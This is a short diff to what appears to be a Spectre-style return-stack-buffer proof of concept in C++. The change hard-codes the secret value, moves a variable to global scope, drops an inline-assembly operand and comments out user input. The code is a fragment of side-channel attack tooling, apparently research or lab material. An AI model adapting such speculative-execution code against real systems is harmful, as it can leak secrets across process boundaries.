@@ -4,10 +4,11 @@
 #include <unistd.h>
 #include <sched.h>
 
-int secret;
+#define secret 3
 char* array;
 
 #define retAsm(i) "call get_rip" #i ";"  "get_rip" #i ":"  "pop %0;" "add $7,%0;" "push %0;" "ret;"
+ADDR_PTR tmp;
 
 using namespace std;
 
@@ -32,7 +33,6 @@ void exploit();
 
 void trickMe() {
 	// while(1) {
-	ADDR_PTR address, tmp;
 
 	while(1) {
 		// sched_yield();
@@ -55,7 +55,6 @@ void trickMe() {
 			retAsm(15)
 			retAsm(16)
 			: "=r" (tmp)
-			: "r" (address)
 		);
 	}
 }
@@ -93,8 +92,8 @@ int main(){
     array = (char*)mmap(0, SIZE, PROT_WRITE, MAP_SHARED, shm_fd, 0); 
 	printf("Done!\n");
 
-	printf("Enter a secret (%d-%d):", lowerBound, upperBound);
-	scanf("%d", &secret);
+	// printf("Enter a secret (%d-%d):", lowerBound, upperBound);
+	// scanf("%d", &secret);
 	printf("Your secret is: %d\n", secret);
 	
 	printf("Running victim code...\n");
